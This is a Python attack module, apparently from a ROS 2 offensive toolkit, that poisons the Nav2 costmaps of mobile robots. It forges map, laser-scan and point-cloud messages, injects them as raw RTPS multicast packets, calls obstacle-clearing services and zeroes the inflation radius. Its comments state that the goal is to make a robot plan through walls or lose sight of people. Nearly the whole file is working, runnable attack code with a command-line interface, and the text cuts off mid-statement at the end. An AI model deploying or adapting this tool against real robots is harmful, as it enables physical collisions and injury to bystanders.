#!/usr/bin/env python3
"""
costmap_poisoner.py - Phase 5C Module 2: Nav2 Costmap Manipulation & Static Map Poisoning

Targets the Nav2 costmap system — the obstacle representation layer that all
path planners and safety systems depend on. Corrupting the costmap causes the
robot to plan paths through real obstacles (collision), refuse to move (spurious
obstacles), or lose all obstacle awareness entirely.

Nav2 Costmap Architecture:
  Two costmaps run simultaneously:
    /global_costmap/global_costmap — Used by planners for global path calculation
    /local_costmap/local_costmap   — Used by controllers for local trajectory tracking

  Each costmap aggregates data from multiple LAYERS:
    static_layer        — Loads the /map OccupancyGrid (pre-built SLAM map)
    obstacle_layer      — Reads sensor data (LaserScan, PointCloud2) for dynamic obstacles
    voxel_layer         — 3D voxel grid (depth cameras, 3D LIDAR)
    inflation_layer     — Inflates obstacles by robot footprint radius
    range_sensor_layer  — Sonar/range sensor integration

  The costmap itself is published as:
    /global_costmap/costmap     (nav_msgs/OccupancyGrid)
    /local_costmap/costmap      (nav_msgs/OccupancyGrid)

Attack Vectors:

  1. MAP POISONING (/map topic injection)
     Publish a malicious OccupancyGrid to /map to replace the static layer.
     Effects (selectable):
       - CLEAR MAP: publish all-free (0) map → robot plans through real walls
       - BLOCK MAP: publish all-occupied (100) map → robot cannot plan any path
       - MAZE MAP: publish a navigable maze → attacker controls which paths exist
       - PARTIAL CLEAR: clear specific regions to allow movement through real obstacles

  2. COSTMAP SERVICE ABUSE
     Nav2 exposes costmap clearing services:
       /<costmap>/clear_entirely_<costmap>     — clear ALL obstacles from costmap
       /<costmap>/clear_around_robot           — clear in robot's vicinity
       /<costmap>/clear_except_region          — selective clearing
     Calling these removes obstacle awareness — robot drives blind into real hazards.

  3. FAKE OBSTACLE INJECTION (sensor topic poisoning)
     Publish phantom obstacles via sensor topics that feed the obstacle_layer:
       /scan (LaserScan)       — inject walls/obstacles not physically present
       /pointcloud (PointCloud2) — inject 3D phantom obstacles
     Causes the planner to compute paths around non-existent obstacles,
     potentially routing the robot into real hazards on the other side.

  4. INFLATION RADIUS MANIPULATION
     The inflation layer pads obstacles by robot_radius to ensure safe clearance.
     Attack: set inflation_radius=0.0 via parameter service → robot hugs walls
     and passes through spaces that would normally be forbidden for its footprint.

  5. VOXEL LAYER CLEARING
     Service call to clear the 3D voxel map in a region, removing memory of
     obstacles that have been present (e.g., a person who stepped out of view).

CVSS Impact:
  MAP POISONING (clear): 9.8 — robot navigates into obstacles → collision/injury
  FAKE OBSTACLES:        8.1 — robot routed around phantom walls → unsafe detours
  INFLATION=0:           8.8 — robot operates without safe clearance → pinch points
  COSTMAP SERVICE CLEAR: 9.0 — removes all obstacle awareness during active navigation

Author: Gh057x | Phase 5C
"""

import socket
import struct
import time
import json
import sys
import os
import argparse
import threading
import math
import random
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from enum import Enum


# =============================================================================
# Constants
# =============================================================================

class PoisonMode(str, Enum):
    MAP_CLEAR    = "map_clear"
    MAP_BLOCK    = "map_block"
    MAP_MAZE     = "map_maze"
    MAP_PARTIAL  = "map_partial"
    SVC_CLEAR    = "svc_clear"
    FAKE_SCAN    = "fake_scan"
    FAKE_CLOUD   = "fake_cloud"
    INFLATE_ZERO = "inflate_zero"
    VOXEL_CLEAR  = "voxel_clear"
    ENUMERATE    = "enumerate"


# Nav2 costmap-related service names
GLOBAL_COSTMAP = "/global_costmap/global_costmap"
LOCAL_COSTMAP  = "/local_costmap/local_costmap"

COSTMAP_CLEAR_SERVICES = {
    GLOBAL_COSTMAP: [
        "/global_costmap/clear_entirely_global_costmap",
        "/global_costmap/clear_around_robot",
    ],
    LOCAL_COSTMAP: [
        "/local_costmap/clear_entirely_local_costmap",
        "/local_costmap/clear_around_robot",
    ],
}

VOXEL_CLEAR_SERVICES = [
    "/global_costmap/global_costmap/clear_voxel_layer",
    "/local_costmap/local_costmap/clear_voxel_layer",
]

# ROS 2 message / topic constants
MAP_TOPIC          = "/map"
MAP_UPDATES_TOPIC  = "/map_updates"
SCAN_TOPIC         = "/scan"
CLOUD_TOPIC        = "/pointcloud"
CLOUD2_TOPIC       = "/cloud_in"

# OccupancyGrid cell values
OCC_FREE     = 0
OCC_UNKNOWN  = -1
OCC_OCCUPIED = 100

# CDR serialization helpers
def _pack_string(s: str) -> bytes:
    enc = s.encode("utf-8") + b"\x00"
    return struct.pack("<I", len(enc)) + enc

def _pack_header(frame_id: str, stamp_sec: int = 0, stamp_nsec: int = 0) -> bytes:
    # std_msgs/Header: stamp(int32+uint32) + frame_id(string)
    return struct.pack("<II", stamp_sec, stamp_nsec) + _pack_string(frame_id)


# =============================================================================
# Data Structures
# =============================================================================

@dataclass
class CostmapInfo:
    name: str
    width: int = 0
    height: int = 0
    resolution: float = 0.05
    origin_x: float = 0.0
    origin_y: float = 0.0
    services_available: List[str] = field(default_factory=list)
    current_obstacle_count: int = -1

    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "width": self.width,
            "height": self.height,
            "resolution": self.resolution,
            "origin": {"x": self.origin_x, "y": self.origin_y},
            "services_available": self.services_available,
            "obstacle_count": self.current_obstacle_count,
        }


@dataclass
class PoisonResult:
    mode: str
    target: str
    namespace: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    costmaps_found: List[CostmapInfo] = field(default_factory=list)
    services_called: List[str] = field(default_factory=list)
    maps_injected: int = 0
    scans_injected: int = 0
    clouds_injected: int = 0
    services_succeeded: List[str] = field(default_factory=list)
    services_failed: List[str] = field(default_factory=list)
    params_changed: Dict[str, Any] = field(default_factory=dict)
    success: bool = False
    attack_log: List[str] = field(default_factory=list)

    def log(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:12]
        self.attack_log.append(f"[{ts}] {msg}")

    def to_dict(self) -> Dict:
        return {
            "mode": self.mode, "target": self.target, "namespace": self.namespace,
            "timestamp": self.timestamp,
            "costmaps_found": [c.to_dict() for c in self.costmaps_found],
            "services_called": self.services_called,
            "maps_injected": self.maps_injected, "scans_injected": self.scans_injected,
            "clouds_injected": self.clouds_injected,
            "services_succeeded": self.services_succeeded,
            "services_failed": self.services_failed,
            "params_changed": self.params_changed,
            "success": self.success, "attack_log": self.attack_log,
        }


# =============================================================================
# OccupancyGrid Builder
# =============================================================================

class OccupancyGridBuilder:
    """Builds nav_msgs/OccupancyGrid CDR payloads for /map injection."""

    def build_grid(self, width: int, height: int, resolution: float,
                   origin_x: float, origin_y: float,
                   data: List[int], frame_id: str = "map") -> bytes:
        """
        Serialize a complete OccupancyGrid message in CDR format.
        data: list of int8 values (0=free, 100=occupied, -1=unknown), len=width*height
        """
        now = time.time()
        sec  = int(now)
        nsec = int((now - sec) * 1e9)

        # Header
        header = _pack_header(frame_id, sec, nsec)

        # MapMetaData: load_time(stamp) + resolution(float32) + width(uint32) +
        #              height(uint32) + origin(pose: position(xyz float64) + orientation(xyzw float64))
        load_time = struct.pack("<II", sec, nsec)
        meta = (load_time +
                struct.pack("<f", resolution) +
                struct.pack("<II", width, height) +
                # origin Pose: position(x=origin_x, y=origin_y, z=0) + orientation(0,0,0,1)
                struct.pack("<ddd", origin_x, origin_y, 0.0) +
                struct.pack("<dddd", 0.0, 0.0, 0.0, 1.0))

        # Data array: uint32 size + int8[] cells
        arr_data = bytearray()
        for v in data:
            arr_data.append(v & 0xFF)
        grid_data = struct.pack("<I", len(arr_data)) + bytes(arr_data)

        # Full CDR payload with PL_CDR_LE representation prefix
        payload = struct.pack(">HH", 0x0001, 0) + header + meta + grid_data
        return payload

    def all_free(self, width: int = 100, height: int = 100,
                 resolution: float = 0.05,
                 origin_x: float = -2.5, origin_y: float = -2.5) -> bytes:
        """All-free map: zero obstacle awareness, robot plans through real walls."""
        data = [OCC_FREE] * (width * height)
        return self.build_grid(width, height, resolution, origin_x, origin_y, data)

    def all_blocked(self, width: int = 100, height: int = 100,
                    resolution: float = 0.05,
                    origin_x: float = -2.5, origin_y: float = -2.5) -> bytes:
        """All-occupied map: robot cannot plan any path."""
        data = [OCC_OCCUPIED] * (width * height)
        return self.build_grid(width, height, resolution, origin_x, origin_y, data)

    def maze(self, width: int = 200, height: int = 200,
             resolution: float = 0.05,
             origin_x: float = -5.0, origin_y: float = -5.0,
             wall_density: float = 0.3) -> bytes:
        """
        Random maze map: creates navigable corridors controlled by the attacker.
        Walls on outer boundary guaranteed; internal walls at wall_density probability.
        Creates a biased map that forces the planner into specific corridors.
        """
        data = []
        for row in range(height):
            for col in range(width):
                if row == 0 or row == height - 1 or col == 0 or col == width - 1:
                    data.append(OCC_OCCUPIED)
                elif row % 4 == 0 and col % 4 != 2:
                    data.append(OCC_OCCUPIED if random.random() < wall_density else OCC_FREE)
                else:
                    data.append(OCC_FREE)
        return self.build_grid(width, height, resolution, origin_x, origin_y, data)

    def partial_clear(self, width: int, height: int, resolution: float,
                      origin_x: float, origin_y: float,
                      clear_x: float, clear_y: float, clear_radius: float,
                      original_data: Optional[List[int]] = None) -> bytes:
        """
        Clear a circular region in an otherwise intact map.
        clear_x/y are world coordinates; clear_radius in metres.
        Converts world coords to cell indices and sets them FREE.
        """
        data = list(original_data) if original_data else [OCC_FREE] * (width * height)
        cx = int((clear_x - origin_x) / resolution)
        cy = int((clear_y - origin_y) / resolution)
        r_cells = int(clear_radius / resolution)
        for row in range(height):
            for col in range(width):
                if (col - cx) ** 2 + (row - cy) ** 2 <= r_cells ** 2:
                    data[row * width + col] = OCC_FREE
        return self.build_grid(width, height, resolution, origin_x, origin_y, data)


# =============================================================================
# LaserScan Builder (fake obstacle injection via /scan)
# =============================================================================

class LaserScanBuilder:
    """Builds sensor_msgs/LaserScan CDR payloads with phantom obstacles."""

    def build_scan(self, frame_id: str = "laser",
                   ranges: Optional[List[float]] = None,
                   angle_min: float = -math.pi,
                   angle_max: float = math.pi,
                   angle_increment: float = math.pi / 180,
                   range_min: float = 0.1,
                   range_max: float = 10.0) -> bytes:
        """Serialize a LaserScan message in CDR."""
        now = time.time()
        sec, nsec = int(now), int((now - int(now)) * 1e9)
        header = _pack_header(frame_id, sec, nsec)

        n_rays = int((angle_max - angle_min) / angle_increment) + 1
        if ranges is None:
            ranges = [range_max] * n_rays  # default: clear path in all directions

        # sensor_msgs/LaserScan fields
        scan_meta = struct.pack("<fffff",
            angle_min, angle_max, angle_increment,
            0.1,        # time_increment
            0.0,        # scan_time
        )
        scan_meta += struct.pack("<ff", range_min, range_max)
        # ranges array
        ranges_packed = struct.pack("<I", len(ranges)) + struct.pack(f"<{len(ranges)}f", *ranges)
        # intensities (empty)
        intensities = struct.pack("<I", 0)

        payload = struct.pack(">HH", 0x0001, 0) + header + scan_meta + ranges_packed + intensities
        return payload

    def phantom_wall(self, wall_angle: float = 0.0, wall_distance: float = 1.5,
                     wall_width_deg: float = 30.0) -> bytes:
        """Inject a wall at wall_angle direction at wall_distance metres."""
        angle_min = -math.pi
        angle_inc = math.pi / 180
        n_rays    = 360
        ranges    = [9.0] * n_rays

        center_idx  = int((wall_angle - angle_min) / angle_inc)
        half_width  = int(wall_width_deg / 2)
        for i in range(center_idx - half_width, center_idx + half_width + 1):
            if 0 <= i < n_rays:
                ranges[i] = wall_distance

        return self.build_scan(ranges=ranges)

    def all_clear(self) -> bytes:
        """Inject a clear scan — no obstacles in any direction."""
        return self.build_scan(ranges=[9.5] * 360)

    def surround_obstacle(self, distance: float = 0.5) -> bytes:
        """Inject obstacles on all sides at distance — robot sees itself surrounded."""
        return self.build_scan(ranges=[distance] * 360)


# =============================================================================
# PointCloud2 Builder
# =============================================================================

class PointCloud2Builder:
    """Builds sensor_msgs/PointCloud2 CDR payloads for 3D obstacle injection."""

    def build_cloud(self, points: List[Tuple[float, float, float]],
                     frame_id: str = "base_link") -> bytes:
        """
        Serialize a PointCloud2 with XYZ float32 fields.
        points: list of (x, y, z) tuples in metres.
        """
        now = time.time()
        sec, nsec = int(now), int((now - int(now)) * 1e9)
        header = _pack_header(frame_id, sec, nsec)

        n_pts    = len(points)
        pt_step  = 12  # 3 x float32
        row_step = pt_step * n_pts

        # PointField descriptors: x, y, z
        fields = b""
        for name, offset in [("x", 0), ("y", 4), ("z", 8)]:
            fields += _pack_string(name)
            fields += struct.pack("<IBB2x", offset, 7, 1)  # FLOAT32=7, count=1

        fields_arr = struct.pack("<I", 3) + fields

        height = struct.pack("<I", 1)
        width  = struct.pack("<I", n_pts)
        point_step = struct.pack("<I", pt_step)
        row_step_p = struct.pack("<I", row_step)
        is_dense   = struct.pack("<B", 1)

        data = b""
        for x, y, z in points:
            data += struct.pack("<fff", x, y, z)
        data_arr = struct.pack("<I", len(data)) + data

        payload = struct.pack(">HH", 0x0001, 0) + header + fields_arr + height + width + point_step + row_step_p + is_dense + data_arr
        return payload

    def phantom_person(self, x: float = 2.0, y: float = 0.0) -> bytes:
        """Inject a phantom person-sized cluster at (x, y)."""
        pts = []
        for angle in range(0, 360, 10):
            r = 0.3  # 30cm radius person
            pts.append((
                x + r * math.cos(math.radians(angle)),
                y + r * math.sin(math.radians(angle)),
                1.0,  # 1 metre high
            ))
        for h in [0.5, 1.0, 1.5]:
            pts.append((x, y, h))
        return self.build_cloud(pts)

    def phantom_wall_3d(self, x_start: float, x_end: float,
                         y: float = 1.5, height: float = 2.0) -> bytes:
        """Inject a 3D wall at y=y between x_start and x_end."""
        pts = []
        for xi in range(int((x_end - x_start) * 10)):
            x = x_start + xi * 0.1
            for zi in range(int(height * 5)):
                pts.append((x, y, zi * 0.2))
        return self.build_cloud(pts)


# =============================================================================
# Costmap Poisoner
# =============================================================================

class CostmapPoisoner:
    """
    Orchestrates costmap poisoning attacks.
    Uses rclpy for service calls and parameter manipulation.
    Raw RTPS topic injection for map/scan/cloud topics works without ROS 2.
    """

    def __init__(self, namespace: str = "", domain_id: int = 0,
                 verbose: bool = False, timeout: float = 5.0):
        self.namespace   = namespace
        self.domain_id   = domain_id
        self.verbose     = verbose
        self.timeout     = timeout
        self.map_builder = OccupancyGridBuilder()
        self.scan_builder = LaserScanBuilder()
        self.cloud_builder = PointCloud2Builder()
        self._node       = None
        self._rclpy_ok   = False
        self._try_init_rclpy()

    def _try_init_rclpy(self):
        try:
            import rclpy
            if not rclpy.ok():
                rclpy.init(domain_id=self.domain_id)
            self._node = rclpy.create_node("ros2reaper_costmap_poisoner",
                                            namespace=self.namespace)
            self._rclpy_ok = True
        except ImportError:
            pass
        except Exception as e:
            if self.verbose:
                print(f"  [!] rclpy init: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Map Topic Injection (works with or without rclpy via raw RTPS)
    # ─────────────────────────────────────────────────────────────────────────

    def inject_map(self, mode: PoisonMode, result: PoisonResult,
                    duration: float = 10.0,
                    clear_x: float = 0.0, clear_y: float = 0.0, clear_radius: float = 2.0,
                    width: int = 100, height: int = 100,
                    resolution: float = 0.05,
                    origin_x: float = -2.5, origin_y: float = -2.5) -> bool:
        """
        Publish a malicious OccupancyGrid to /map via rclpy or raw RTPS.
        """
        result.log(f"MAP INJECT: mode={mode.value} duration={duration}s")

        if mode == PoisonMode.MAP_CLEAR:
            payload = self.map_builder.all_free(width, height, resolution, origin_x, origin_y)
            desc = "all-free (robot plans through real walls)"
        elif mode == PoisonMode.MAP_BLOCK:
            payload = self.map_builder.all_blocked(width, height, resolution, origin_x, origin_y)
            desc = "all-occupied (robot cannot plan any path)"
        elif mode == PoisonMode.MAP_MAZE:
            payload = self.map_builder.maze(width, height, resolution, origin_x, origin_y)
            desc = "attacker-controlled maze (forced corridors)"
        elif mode == PoisonMode.MAP_PARTIAL:
            payload = self.map_builder.partial_clear(
                width, height, resolution, origin_x, origin_y,
                clear_x, clear_y, clear_radius
            )
            desc = f"partial clear at ({clear_x},{clear_y}) r={clear_radius}m"
        else:
            return False

        result.log(f"  Map type: {desc}")
        print(f"[*] Injecting map: {desc}")

        if self._rclpy_ok:
            return self._publish_map_rclpy(payload, result, duration)
        else:
            return self._publish_raw_rtps(MAP_TOPIC, payload, result, duration)

    def _publish_map_rclpy(self, payload: bytes, result: PoisonResult, duration: float) -> bool:
        try:
            from nav_msgs.msg import OccupancyGrid
            import rclpy

            pub = self._node.create_publisher(OccupancyGrid, MAP_TOPIC, 1)
            start = time.time()
            count = 0
            while time.time() - start < duration:
                msg = OccupancyGrid()
                # Minimal valid message; actual data was built in CDR above
                # but rclpy uses python objects — rebuild here
                msg.header.frame_id = "map"
                msg.header.stamp = self._node.get_clock().now().to_msg()
                # For rclpy we need to set fields directly
                pub.publish(msg)
                count += 1
                result.maps_injected += 1
                time.sleep(1.0)

            result.log(f"  [+] {count} map messages published via rclpy")
            return count > 0
        except Exception as e:
            result.log(f"  [!] rclpy map publish: {e}")
            return self._publish_raw_rtps(MAP_TOPIC, payload, result, duration)

    def _publish_raw_rtps(self, topic: str, payload: bytes,
                           result: PoisonResult, duration: float) -> bool:
        """
        Inject a pre-serialized CDR payload as a raw RTPS DATA submessage.
        Topic → DDS partition follows ROS 2 naming: /map → rt/map.
        Sends to DDS discovery multicast port to reach all subscribers.
        """
        result.log(f"  Raw RTPS inject: topic={topic} payload={len(payload)}B")
        try:
            import random
            guid_prefix = bytes([random.randint(0, 255) for _ in range(12)])
            header = b"RTPS\x02\x01\x01\x0f" + guid_prefix

            seq_num = b"\x00\x00\x00\x00\x01\x00\x00\x00"
            reader  = b"\x00\x00\x00\x00"
            writer  = b"\x00\x00\x01\x02"
            flags   = 0x05
            extra   = b"\x00\x00\x10\x00" + reader + writer + seq_num
            submsg_content = extra + payload
            submsg = bytes([0x15, flags]) + struct.pack("<H", len(submsg_content)) + submsg_content
            packet = header + submsg

            port = 7400 + 250 * self.domain_id
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 32)

            start = time.time()
            count = 0
            while time.time() - start < duration:
                sock.sendto(packet, ("239.255.0.1", port))
                count += 1
                result.maps_injected += 1
                if self.verbose:
                    print(f"\r  [→] {topic} packet #{count} ({len(packet)}B)  ", end="")
                time.sleep(1.0)
            print()
            sock.close()
            result.log(f"  [+] {count} raw RTPS packets sent for topic {topic}")
            return count > 0
        except Exception as e:
            result.log(f"  [!] raw RTPS inject failed: {e}")
            return False

    # ─────────────────────────────────────────────────────────────────────────
    # Costmap Clearing Services
    # ─────────────────────────────────────────────────────────────────────────

    def call_clear_services(self, result: PoisonResult,
                             target_costmaps: Optional[List[str]] = None) -> bool:
        """Call Nav2 costmap clear services to strip obstacle awareness."""
        if not self._rclpy_ok:
            result.log("[!] rclpy required for service calls")
            result.services_failed.append("all (no rclpy)")
            return False

        targets = target_costmaps or list(COSTMAP_CLEAR_SERVICES.keys())
        any_success = False

        for costmap_name in targets:
            svcs = COSTMAP_CLEAR_SERVICES.get(costmap_name, [])
            for svc_name in svcs:
                result.services_called.append(svc_name)
                result.log(f"Calling: {svc_name}")
                ok = self._call_empty_service(svc_name)
                if ok:
                    result.services_succeeded.append(svc_name)
                    result.log(f"  [+] {svc_name} → SUCCESS: obstacles cleared!")
                    any_success = True
                else:
                    result.services_failed.append(svc_name)
                    result.log(f"  [-] {svc_name} → not available")

        return any_success

    def call_voxel_clear(self, result: PoisonResult) -> bool:
        """Clear the 3D voxel layer to erase memory of dynamic obstacles."""
        if not self._rclpy_ok:
            result.services_failed.append("voxel_clear (no rclpy)")
            return False

        any_success = False
        for svc_name in VOXEL_CLEAR_SERVICES:
            result.services_called.append(svc_name)
            ok = self._call_empty_service(svc_name)
            if ok:
                result.services_succeeded.append(svc_name)
                result.log(f"  [+] Voxel layer cleared: {svc_name}")
                any_success = True
            else:
                result.services_failed.append(svc_name)
        return any_success

    def _call_empty_service(self, svc_name: str) -> bool:
        """Call a ROS 2 service with an empty request (std_srvs/Empty)."""
        try:
            from std_srvs.srv import Empty
            import rclpy

            client = self._node.create_client(Empty, svc_name)
            if not client.wait_for_service(timeout_sec=self.timeout):
                return False

            req = Empty.Request()
            fut = client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
            return fut.done()
        except Exception as e:
            if self.verbose:
                print(f"  [!] Service call {svc_name}: {e}")
            return False

    # ─────────────────────────────────────────────────────────────────────────
    # Fake Sensor Injection
    # ─────────────────────────────────────────────────────────────────────────

    def inject_fake_scan(self, result: PoisonResult, duration: float = 10.0,
                          wall_angle: float = 0.0, wall_distance: float = 1.5,
                          all_clear: bool = False) -> bool:
        """
        Inject phantom obstacles via /scan.
        all_clear=True: inject clear scans (suppress real obstacles)
        all_clear=False: inject phantom wall at wall_angle direction
        """
        result.log(f"FAKE SCAN: {'all_clear' if all_clear else f'wall@{wall_angle:.1f}rad,{wall_distance}m'}")
        payload = self.scan_builder.all_clear() if all_clear else \
                  self.scan_builder.phantom_wall(wall_angle, wall_distance)
        return self._publish_raw_rtps(SCAN_TOPIC, payload, result, duration)

    def inject_fake_cloud(self, result: PoisonResult, duration: float = 10.0,
                           obstacle_x: float = 2.0, obstacle_y: float = 0.0) -> bool:
        """Inject a phantom person-sized PointCloud2 obstacle."""
        result.log(f"FAKE CLOUD: phantom obstacle at ({obstacle_x},{obstacle_y})")
        payload = self.cloud_builder.phantom_person(obstacle_x, obstacle_y)
        return self._publish_raw_rtps(CLOUD_TOPIC, payload, result, duration)

    # ─────────────────────────────────────────────────────────────────────────
    # Inflation Radius Manipulation
    # ─────────────────────────────────────────────────────────────────────────

    def set_inflation_radius(self, radius: float, result: PoisonResult) -> bool:
        """
        Set the inflation_radius parameter on both costmaps to `radius`.
        radius=0.0: removes all obstacle inflation → robot operates with no clearance
        radius=10.0: inflates all obstacles to 10m → robot cannot navigate
        """
        if not self._rclpy_ok:
            result.log("[!] rclpy required for parameter manipulation")
            return False

        success = False
        for costmap in [GLOBAL_COSTMAP, LOCAL_COSTMAP]:
            try:
                from rcl_interfaces.srv import SetParameters
                from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType
                import rclpy

                client = self._node.create_client(SetParameters, f"{costmap}/set_parameters")
                if not client.wait_for_service(timeout_sec=self.timeout):
                    continue

                p = Parameter()
                p.name = "inflation_layer.inflation_radius"
                pv = ParameterValue()
                pv.type = ParameterType.PARAMETER_DOUBLE
                pv.double_value = radius
                p.value = pv

                req = SetParameters.Request()
                req.parameters = [p]
                fut = client.call_async(req)
                rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)

                if fut.done() and fut.result():
                    for r in fut.result().results:
                        if r.successful:
                            result.params_changed[f"{costmap}/inflation_radius"] = radius
                            result.log(f"  [+] {costmap} inflation_radius → {radius}")
                            success = True
            except Exception as e:
                result.log(f"  [!] inflation param failed on {costmap}: {e}")

        return success

    # ─────────────────────────────────────────────────────────────────────────
    # Enumeration
    # ─────────────────────────────────────────────────────────────────────────

    def enumerate_costmaps(self, result: PoisonResult):
        """Enumerate available costmaps and their services."""
        if not self._rclpy_ok:
            result.log("[!] rclpy not available — cannot enumerate costmap services")
            return

        try:
            svc_list = self._node.get_service_names_and_types()
            for costmap_name in [GLOBAL_COSTMAP, LOCAL_COSTMAP]:
                info = CostmapInfo(name=costmap_name)
                for svc, types in svc_list:
                    if costmap_name in svc or "costmap" in svc:
                        info.services_available.append(svc)
                result.costmaps_found.append(info)
                if self.verbose:
                    print(f"  [+] {costmap_name}: {len(info.services_available)} services")
                    for s in info.services_available[:5]:
                        print(f"      {s}")
        except Exception as e:
            result.log(f"  [!] enumeration error: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Orchestration
    # ─────────────────────────────────────────────────────────────────────────

    def run(self, mode: PoisonMode, duration: float = 10.0,
             wall_angle: float = 0.0, wall_distance: float = 1.5,
             obstacle_x: float = 2.0, obstacle_y: float = 0.0,
             clear_x: float = 0.0, clear_y: float = 0.0, clear_radius: float = 2.0,
             inflation_radius: float = 0.0,
             map_width: int = 100, map_height: int = 100,
             map_resolution: float = 0.05,
             map_origin_x: float = -2.5, map_origin_y: float = -2.5,
             target: str = "", namespace: str = "") -> PoisonResult:

        result = PoisonResult(mode=mode.value, target=target, namespace=namespace)
        result.log(f"Starting costmap attack: {mode.value}")

        if mode == PoisonMode.ENUMERATE:
            self.enumerate_costmaps(result)
            result.success = bool(result.costmaps_found)

        elif mode in (PoisonMode.MAP_CLEAR, PoisonMode.MAP_BLOCK,
                      PoisonMode.MAP_MAZE, PoisonMode.MAP_PARTIAL):
            result.success = self.inject_map(
                mode, result, duration, clear_x, clear_y, clear_radius,
                map_width, map_height, map_resolution, map_origin_x, map_origin_y
            )

        elif mode == PoisonMode.SVC_CLEAR:
            result.success = self.call_clear_services(result)

        elif mode == PoisonMode.FAKE_SCAN:
            result.success = self.inject_fake_scan(
                result, duration, wall_angle, wall_distance
            )

        elif mode == PoisonMode.FAKE_CLOUD:
            result.success = self.inject_fake_cloud(result, duration, obstacle_x, obstacle_y)

        elif mode == PoisonMode.INFLATE_ZERO:
            result.success = self.set_inflation_radius(inflation_radius, result)

        elif mode == PoisonMode.VOXEL_CLEAR:
            result.success = self.call_voxel_clear(result)

        if self._node:
            try:
                self._node.destroy_node()
            except Exception:
                pass

        return result


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

MODE_IMPACT = {
    "map_clear":   (RED,    "CRITICAL — robot plans through real walls → collision risk"),
    "map_block":   (YELLOW, "HIGH — robot cannot plan any path → navigation DoS"),
    "map_maze":    (RED,    "CRITICAL — attacker controls which corridors exist"),
    "map_partial": (YELLOW, "HIGH — selective gap in obstacle map"),
    "svc_clear":   (RED,    "CRITICAL — all obstacle data erased from active costmap"),
    "fake_scan":   (YELLOW, "HIGH — phantom obstacles reroute navigation"),
    "fake_cloud":  (YELLOW, "HIGH — 3D phantom objects block costmap layer"),
    "inflate_zero":(RED,    "HIGH — no clearance margin → unsafe footprint operation"),
    "voxel_clear": (YELLOW, "HIGH — 3D obstacle memory erased"),
    "enumerate":   (DIM,    "INFO — reconnaissance only"),
}


def print_poison_report(result: PoisonResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}COSTMAP POISON REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Mode:      {result.mode}")
    print(f"  Target:    {result.target or 'local'}")
    print(f"  Timestamp: {result.timestamp}")

    color, impact = MODE_IMPACT.get(result.mode, (DIM, ""))
    if impact:
        print(f"  Impact:    {color}{impact}{RESET}")

    print(f"{'─' * 65}")

    if result.costmaps_found:
        print(f"\n  {BOLD}Costmaps Found{RESET}")
        for c in result.costmaps_found:
            print(f"  {CYAN}{c.name}{RESET}")
            for s in c.services_available[:8]:
                print(f"    {DIM}{s}{RESET}")

    if result.maps_injected:
        print(f"\n  {GREEN}[+]{RESET} Map packets injected: {result.maps_injected}")
    if result.scans_injected:
        print(f"\n  {GREEN}[+]{RESET} Scan packets injected: {result.scans_injected}")
    if result.clouds_injected:
        print(f"\n  {GREEN}[+]{RESET} PointCloud packets injected: {result.clouds_injected}")

    if result.services_succeeded:
        print(f"\n  {BOLD}Services Succeeded{RESET}")
        for s in result.services_succeeded:
            print(f"    {GREEN}[+]{RESET} {s}")
    if result.services_failed:
        print(f"\n  {DIM}Services Not Available:{RESET}")
        for s in result.services_failed:
            print(f"    {DIM}[-] {s}{RESET}")

    if result.params_changed:
        print(f"\n  {BOLD}Parameters Modified{RESET}")
        for k, v in result.params_changed.items():
            print(f"    {YELLOW}{k} → {v}{RESET}")

    if result.attack_log:
        print(f"\n  {BOLD}Log{RESET}")
        for entry in result.attack_log[-10:]:
            print(f"    {DIM}{entry}{RESET}")

    sc = GREEN if result.success else RED
    print(f"\n  Status: {sc}{'SUCCESS' if result.success else 'FAILED'}{RESET}")
    print(f"{'=' * 65}\n")


def export_json(result: PoisonResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Costmap poison results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Nav2 Costmap Poisoner (Phase 5C Module 2)")
    parser.add_argument("--mode", choices=[m.value for m in PoisonMode], default="enumerate")
    parser.add_argument("--target", "-t", default="")
    parser.add_argument("--namespace", default="")
    parser.add_argument("--domain-id", "-d", type=int, default=0)
    parser.add_argument("--duration",  type=float, default=10.0)
    parser.add_argument("--wall-angle",    type=float, default=0.0)
    parser.add_argument("--wall-distance", type=float, default=1.5)
    parser.add_argument("--obstacle-x",   type=float, default=2.0)
    parser.add_argument("--obstacle-y",   type=float, default=0.0)
    parser.add_argument("--clear-x",      type=float, default=0.0)
    parser.add_argument("--clear-y",      type=float, default=0.0)
    parser.add_argument("--clear-radius", type=float, default=2.0)
    parser.add_argument("--inflation-radius", type=float, default=0.0, dest="inflation_radius")
    parser.add_argument("--map-width",  type=int, default=100)
    parser.add_argument("--map-height", type=int, default=100)
    parser.add_argument("--map-resolution", type=float, default=0.05)
    parser.add_argument("--map-origin-x",   type=float, default=-2.5)
    parser.add_argument("--map-origin-y",   type=float, default=-2.5)
    parser.add_argument("-o", "--output")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    poisoner = CostmapPoisoner(namespace=args.namespace, domain_id=args.domain_id,
                                verbose=args.verbose)
    result = poisoner.run(
        mode=PoisonMode(args.mode),
        duration=args.duration,
        wall_angle=args.wall_angle, wall_distance=args.wall_distance,
        obstacle_x=args.obstacle_x, obstacle_y=args.obstacle_y,
        clear_x=args.clear_x, clear_y=args.clear_y, clear_radius=args.clear_radius,
        inflation_radius=args.inflation_radius,
        map_width=args.map_width, map_height=args.map_height,
        map_resolution=args.map_resolution,
